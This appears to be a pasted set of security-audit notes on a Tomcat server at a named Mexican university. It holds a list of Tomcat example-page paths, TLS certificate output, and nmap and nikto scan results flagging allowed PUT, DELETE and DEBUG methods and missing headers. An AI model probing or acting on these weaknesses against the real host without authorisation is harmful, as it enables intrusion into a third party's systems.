+error/error.html
+error/error.html
+error/er.html
+error/er.html
+sessions/carts.html
+sessions/carts.html
+sessions/crt.html
+sessions/crt.html
+checkbox/check.html
+checkbox/check.html
+checkbox/cresult.html
+checkbox/cresult.html
+colors/colors.html
+colors/colors.html
+colors/clr.html
+colors/clr.html
+cal/login.html
+cal/login.html
+cal/calendar.html
+cal/calendar.html
+include/include.jsp
+include/include.jsp
+include/inc.html
+include/inc.html
+forward/forward.jsp
+forward/forward.jsp
+forward/fwd.html
+forward/fwd.html
+plugin/plugin.jsp
+plugin/plugin.jsp
+plugin/plugin.html
+plugin/plugin.html
+jsptoserv/jsptoservlet.jsp
+jsptoserv/jsptoservlet.jsp
+jsptoserv/jts.html
+jsptoserv/jts.html
+simpletag/foo.jsp
+simpletag/foo.jsp
+simpletag/foo.html
+simpletag/foo.html
+xml/xml.jsp
+xml/xml.jsp
+xml/xml.html
+xml/xml.html
+tagplugin/if.jsp
+tagplugin/if.jsp
+tagplugin/if.html
+tagplugin/if.html
+tagplugin/foreach.jsp
+tagplugin/foreach.jsp
+tagplugin/foreach.html
+tagplugin/foreach.html
+tagplugin/choose.jsp
+tagplugin/choose.jsp
+tagplugin/choose.html
+tagplugin/choose.html
+
+
+
+openssl s_client -connect sito.utslp.edu.mx:443 -showcerts < /dev/null
+CONNECTED(00000003)
+depth=2 C = US, ST = Arizona, L = Scottsdale, O = "Starfield Technologies, Inc.", CN = Starfield Root Certificate Authority - G2
+verify return:1
+depth=1 C = US, ST = Arizona, L = Scottsdale, O = "Starfield Technologies, Inc.", OU = http://certs.starfieldtech.com/repository/, CN = Starfield Secure Certificate Authority - G2
+verify return:1
+depth=0 CN = *.utslp.edu.mx
+verify return:1
+---
+Certificate chain
+ 0 s:CN = *.utslp.edu.mx
+   i:C = US, ST = Arizona, L = Scottsdale, O = "Starfield Technologies, Inc.", OU = http://certs.starfieldtech.com/repository/, CN = Starfield Secure Certificate Authority - G2
+   a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA256
+   v:NotBefore: Mar 12 22:57:40 2025 GMT; NotAfter: Apr 13 22:57:40 2026 GMT
+-----BEGIN CERTIFICATE-----
+MIIGuDCCBaCgAwIBAgIJAM22ouJPS0E6MA0GCSqGSIb3DQEBCwUAMIHGMQswCQYD
+VQQGEwJVUzEQMA4GA1UECBMHQXJpem9uYTETMBEGA1UEBxMKU2NvdHRzZGFsZTEl
+MCMGA1UEChMcU3RhcmZpZWxkIFRlY2hub2xvZ2llcywgSW5jLjEzMDEGA1UECxMq
+aHR0cDovL2NlcnRzLnN0YXJmaWVsZHRlY2guY29tL3JlcG9zaXRvcnkvMTQwMgYD
+VQQDEytTdGFyZmllbGQgU2VjdXJlIENlcnRpZmljYXRlIEF1dGhvcml0eSAtIEcy
+MB4XDTI1MDMxMjIyNTc0MFoXDTI2MDQxMzIyNTc0MFowGTEXMBUGA1UEAwwOKi51
+dHNscC5lZHUubXgwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCtP46b
+cw7tw12t4COW/NHIejzsHD8MaRcNtON06pFvKN6b50wfgvjoaU/Ix/03FAbUi4Vg
+9YDiByzJGHrMyelthBLmc057/YiQn2k0HAUHgHpyJvo98kT7YmrX2TmlrH1D1ki6
+52aCHmJtQi0ysBt9Y38ESR3leiAsbJJgkRBX/ferXgIo+DogYhgGH3+lrkj98Xpy
+UXBnPqAZykICPlhO8/VaZAvB+03gRi/XeMIEbC1hzPZSq8XxmQhB+tx31GaQ508B
+PGpX7u0oToF1y/O0eLpE1XTAacPtchCNbbZUu5r4FBgnFPxAsH4uRl0G7sKuehZo
+fird7Qh+j7f402ndAgMBAAGjggNTMIIDTzAMBgNVHRMBAf8EAjAAMB0GA1UdJQQW
+MBQGCCsGAQUFBwMBBggrBgEFBQcDAjAOBgNVHQ8BAf8EBAMCBaAwPQYDVR0fBDYw
+NDAyoDCgLoYsaHR0cDovL2NybC5zdGFyZmllbGR0ZWNoLmNvbS9zZmlnMnMxLTgy
+Mi5jcmwwYwYDVR0gBFwwWjBOBgtghkgBhv1uAQcXATA/MD0GCCsGAQUFBwIBFjFo
+dHRwOi8vY2VydGlmaWNhdGVzLnN0YXJmaWVsZHRlY2guY29tL3JlcG9zaXRvcnkv
+MAgGBmeBDAECATCBggYIKwYBBQUHAQEEdjB0MCoGCCsGAQUFBzABhh5odHRwOi8v
+b2NzcC5zdGFyZmllbGR0ZWNoLmNvbS8wRgYIKwYBBQUHMAKGOmh0dHA6Ly9jZXJ0
+aWZpY2F0ZXMuc3RhcmZpZWxkdGVjaC5jb20vcmVwb3NpdG9yeS9zZmlnMi5jcnQw
+HwYDVR0jBBgwFoAUJUWBaFAmOD07LSy+zWrZtj2zZmMwJwYDVR0RBCAwHoIOKi51
+dHNscC5lZHUubXiCDHV0c2xwLmVkdS5teDAdBgNVHQ4EFgQUiaDTzmmj8jy0ClYL
+dusjGOossDgwggF8BgorBgEEAdZ5AgQCBIIBbASCAWgBZgB2AA5XlLzzrqk+Mxss
+mQez95Dfm8I9cTIl3SGpJaxhxU4hAAABlYyT8ugAAAQDAEcwRQIhAPCLRrvMQDy2
+K9HFPNrzbFREnsUw5J/Cjqkl45z5thZ0AiBPsfCGpOj5gZLVTVf1rUCV3RTBLasS
+txffYGDVqW5OEgB1AGQRxGykEuyniRyiAi4AvKtPKAfUHjUnq+r+1QPJfc3wAAAB
+lYyT8+cAAAQDAEYwRAIgYrWW37rGLS0Cv57S+7td2PQWXXHJUzQuqS4FsmTibl0C
+IClKDl72mRntIBRxF/RV1vuZCTvnf4LN6zX3R6WPHijjAHUAyzj3FYl8hKFEX1vB
+3fvJbvKaWc1HCmkFhbDLFMMUWOcAAAGVjJP0TgAABAMARjBEAiAJiJN+IbENc+N/
+WNr7sIDpQDUHhJSpQNalrCQIrAvnygIgOkam9A26PMN1x3jMF5ZtVVLnrTgFV1cG
+B25OmVWvBDMwDQYJKoZIhvcNAQELBQADggEBAFh3UUDA5C+e4bKhbtHc+2Z8dzXK
+ijZcGS0kYnMcjAxQFPVsICZWrwGWm6V5XXQJMFk9jCj88F61BR1FhTOBJgOZtXDp
+JX1BuQu37HIjAc8nXEZBElkZGexyoXAnmheUywkyQ+ILNyoOp99ddawE54RPaQs1
+EBk1LyJVFjLk7JrBNDXkFAXufqbIqXv9ug6ViZxOs0k1y4Ujl4fumTGAvtosZiAC
+rHjkj61nKpdE8hzM7prFSjAY1RIsubrIy+bcR/IvskrJA17Mwjo9bOJ0uKkU0Vvq
+w84/RWXTXtzZTjYFSa5JJr/SPL+erk0atGXJcwfXemZO0tR272z0FUIMJ9s=
+-----END CERTIFICATE-----
+ 1 s:C = US, ST = Arizona, L = Scottsdale, O = "Starfield Technologies, Inc.", OU = http://certs.starfieldtech.com/repository/, CN = Starfield Secure Certificate Authority - G2
+   i:C = US, ST = Arizona, L = Scottsdale, O = "Starfield Technologies, Inc.", CN = Starfield Root Certificate Authority - G2
+   a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA256
+   v:NotBefore: May  3 07:00:00 2011 GMT; NotAfter: May  3 07:00:00 2031 GMT
+-----BEGIN CERTIFICATE-----
+MIIFADCCA+igAwIBAgIBBzANBgkqhkiG9w0BAQsFADCBjzELMAkGA1UEBhMCVVMx
+EDAOBgNVBAgTB0FyaXpvbmExEzARBgNVBAcTClNjb3R0c2RhbGUxJTAjBgNVBAoT
+HFN0YXJmaWVsZCBUZWNobm9sb2dpZXMsIEluYy4xMjAwBgNVBAMTKVN0YXJmaWVs
+ZCBSb290IENlcnRpZmljYXRlIEF1dGhvcml0eSAtIEcyMB4XDTExMDUwMzA3MDAw
+MFoXDTMxMDUwMzA3MDAwMFowgcYxCzAJBgNVBAYTAlVTMRAwDgYDVQQIEwdBcml6
+b25hMRMwEQYDVQQHEwpTY290dHNkYWxlMSUwIwYDVQQKExxTdGFyZmllbGQgVGVj
+aG5vbG9naWVzLCBJbmMuMTMwMQYDVQQLEypodHRwOi8vY2VydHMuc3RhcmZpZWxk
+dGVjaC5jb20vcmVwb3NpdG9yeS8xNDAyBgNVBAMTK1N0YXJmaWVsZCBTZWN1cmUg
+Q2VydGlmaWNhdGUgQXV0aG9yaXR5IC0gRzIwggEiMA0GCSqGSIb3DQEBAQUAA4IB
+DwAwggEKAoIBAQDlkGZL7PlGcakgg77pbL9KyUhpgXVObST2yxcT+LBxWYR6ayuF
+pDS1FuXLzOlBcCykLtb6Mn3hqN6UEKwxwcDYav9ZJ6t21vwLdGu4p64/xFT0tDFE
+3ZNWjKRMXpuJyySDm+JXfbfYEh/JhW300YDxUJuHrtQLEAX7J7oobRfpDtZNuTlV
+Bv8KJAV+L8YdcmzUiymMV33a2etmGtNPp99/UsQwxaXJDgLFU793OGgGJMNmyDd+
+MB5FcSM1/5DYKp2N57CSTTx/KgqT3M0WRmX3YISLdkuRJ3MUkuDq7o8W6o0OPnYX
+v32JgIBEQ+ct4EMJddo26K3biTr1XRKOIwSDAgMBAAGjggEsMIIBKDAPBgNVHRMB
+Af8EBTADAQH/MA4GA1UdDwEB/wQEAwIBBjAdBgNVHQ4EFgQUJUWBaFAmOD07LSy+
+zWrZtj2zZmMwHwYDVR0jBBgwFoAUfAwyH6fZMH/EfWijYqihzqsHWycwOgYIKwYB
+BQUHAQEELjAsMCoGCCsGAQUFBzABhh5odHRwOi8vb2NzcC5zdGFyZmllbGR0ZWNo
+LmNvbS8wOwYDVR0fBDQwMjAwoC6gLIYqaHR0cDovL2NybC5zdGFyZmllbGR0ZWNo
+LmNvbS9zZnJvb3QtZzIuY3JsMEwGA1UdIARFMEMwQQYEVR0gADA5MDcGCCsGAQUF
+BwIBFitodHRwczovL2NlcnRzLnN0YXJmaWVsZHRlY2guY29tL3JlcG9zaXRvcnkv
+MA0GCSqGSIb3DQEBCwUAA4IBAQBWZcr+8z8KqJOLGMfeQ2kTNCC+Tl94qGuc22pN
+QdvBE+zcMQAiXvcAngzgNGU0+bE6TkjIEoGIXFs+CFN69xpk37hQYcxTUUApS8L0
+rjpf5MqtJsxOYUPl/VemN3DOQyuwlMOS6eFfqhBJt2nk4NAfZKQrzR9voPiEJBjO
+eT2pkb9UGBOJmVQRDVXFJgt5T1ocbvlj2xSApAer+rKluYjdkf5lO6Sjeb6JTeHQ
+sPTIFwwKlhR8Cbds4cLYVdQYoKpBaXAko7nv6VrcPuuUSvC33l8Odvr7+2kDRUBQ
+7nIMpBKGgc0T0U7EPMpODdIm8QC3tKai4W56gf0wrHofx1l7
+-----END CERTIFICATE-----
+ 2 s:C = US, ST = Arizona, L = Scottsdale, O = "Starfield Technologies, Inc.", CN = Starfield Root Certificate Authority - G2
+   i:C = US, ST = Arizona, L = Scottsdale, O = "Starfield Technologies, Inc.", CN = Starfield Root Certificate Authority - G2
+   a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA256
+   v:NotBefore: Sep  1 00:00:00 2009 GMT; NotAfter: Dec 31 23:59:59 2037 GMT
+-----BEGIN CERTIFICATE-----
+MIID3TCCAsWgAwIBAgIBADANBgkqhkiG9w0BAQsFADCBjzELMAkGA1UEBhMCVVMx
+EDAOBgNVBAgTB0FyaXpvbmExEzARBgNVBAcTClNjb3R0c2RhbGUxJTAjBgNVBAoT
+HFN0YXJmaWVsZCBUZWNobm9sb2dpZXMsIEluYy4xMjAwBgNVBAMTKVN0YXJmaWVs
+ZCBSb290IENlcnRpZmljYXRlIEF1dGhvcml0eSAtIEcyMB4XDTA5MDkwMTAwMDAw
+MFoXDTM3MTIzMTIzNTk1OVowgY8xCzAJBgNVBAYTAlVTMRAwDgYDVQQIEwdBcml6
+b25hMRMwEQYDVQQHEwpTY290dHNkYWxlMSUwIwYDVQQKExxTdGFyZmllbGQgVGVj
+aG5vbG9naWVzLCBJbmMuMTIwMAYDVQQDEylTdGFyZmllbGQgUm9vdCBDZXJ0aWZp
+Y2F0ZSBBdXRob3JpdHkgLSBHMjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC
+ggEBAL3twQP89o/8ArFvW59I2Z154qK3A2FWGMNHttfKPTUuiUP3oWmb3ooa/RMg
+nLRJdzIpVv257IzdIvpy3Cdhl+72WoTsbhm5iSzchFvVdPtrX8WJpRBSiUZV9Lh1
+HOZ/5FSuS/hVclcCGfgXcVnrHigHdMWdSL5stPSksPNkN3mSwOxGXn/hbVNMYq/N
+Hwtjuzqd+/x5AJhhdM8mgkBj87JyahkNmcrUDnXMN/uLicFZ8WJ/X7NfZTD4p7dN
+dloedl40wOiWVpmKs/B/pM293DIxfJHP4F8R+GuqSVzRmZTRouNjWwl2tVZi4Ut0
+HZbUJtQIBFnQmA4O5t78w+wfkPECAwEAAaNCMEAwDwYDVR0TAQH/BAUwAwEB/zAO
+BgNVHQ8BAf8EBAMCAQYwHQYDVR0OBBYEFHwMMh+n2TB/xH1oo2Kooc6rB1snMA0G
+CSqGSIb3DQEBCwUAA4IBAQARWfolTwNvlJk7mh+ChTnUdgWUXuEok21iXQnCoKjU
+sHU48TRqneSfioYmUeYs0cYtbpUgSpIB7LiKZ3sx4mcujJUDJi5DnUox9g61DLu3
+4jd/IroAow57UvtruzvE03lRTs2Q9GcHGcg8RnoNAX3FWOdt5oUwF5okxBDgBPfg
+8n/Uqgr/Qh037ZTlZFkSIHc40zI+OIF1lnP6aI+xy84fxez6nH7PfrHxBy22/L/K
+pL/QlwVKvOoYKAKQvVR4CSFx09F9HdkWsKlhPdAKACL8x3vLCWRFCztAgfd9fDL1
+mMpYjn0q7pBZc2T5NnReJaH1ZgUufzkVqSr7UIuOhWn0
+-----END CERTIFICATE-----
+---
+Server certificate
+subject=CN = *.utslp.edu.mx
+issuer=C = US, ST = Arizona, L = Scottsdale, O = "Starfield Technologies, Inc.", OU = http://certs.starfieldtech.com/repository/, CN = Starfield Secure Certificate Authority - G2
+---
+No client certificate CA names sent
+Peer signing digest: SHA256
+Peer signature type: RSA-PSS
+Server Temp Key: ECDH, prime256v1, 256 bits
+---
+SSL handshake has read 4890 bytes and written 864 bytes
+Verification: OK
+---
+New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384
+Server public key is 2048 bit
+Secure Renegotiation IS NOT supported
+Compression: NONE
+Expansion: NONE
+No ALPN negotiated
+Early data was not sent
+Verify return code: 0 (ok)
+---
+DONE
+
+
++] Starting Tomcat Audit for sito.utslp.edu.mx
+[+] Date: vie 03 oct 2025 13:15:48 CST
+[1] Port Scanning
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-03 13:15 CST
+Nmap scan report for sito.utslp.edu.mx (189.254.143.102)
+Host is up (0.012s latency).
+rDNS record for 189.254.143.102: utslp.edu.mx
+
+PORT     STATE    SERVICE    VERSION
+80/tcp   open     http       Apache Tomcat/Coyote JSP engine 1.1
+443/tcp  filtered https
+8000/tcp filtered http-alt
+8005/tcp filtered mxi
+8009/tcp filtered ajp13
+8080/tcp filtered http-proxy
+8443/tcp filtered https-alt
+
+└──╼ $nikto -h https://sito.utslp.edu.mx/ -C all -o nikto_scan.txt
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          189.254.143.102
++ Target Hostname:    sito.utslp.edu.mx
++ Target Port:        443
+---------------------------------------------------------------------------
++ SSL Info:        Subject:  /CN=*.utslp.edu.mx
+                   Ciphers:  TLS_AES_256_GCM_SHA384
+                   Issuer:   /C=US/ST=Arizona/L=Scottsdale/O=Starfield Technologies, Inc./OU=http:\/\/certs.starfieldtech.com\/repository\//CN=Starfield Secure Certificate Authority - G2
++ Start Time:         2025-10-03 12:54:40 (GMT-6)
+---------------------------------------------------------------------------
++ Server: Apache-Coyote/1.1
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The site uses TLS and the Strict-Transport-Security HTTP header is not defined. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ /HnORyhHc.ini: Cookie JSESSIONID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
++ Multiple index files found: /index.jsp, /index.html.
++ Server is using a wildcard certificate: *.utslp.edu.mx. See: https://en.wikipedia.org/wiki/Wildcard_certificate
++ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS .
++ HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
++ HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
++ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
++ /: DEBUG HTTP verb may show server debugging information. See: https://docs.microsoft.com/en-us/visualstudio/debugger/how-to-enable-debugging-for-aspnet-applications?view=vs-2017
+
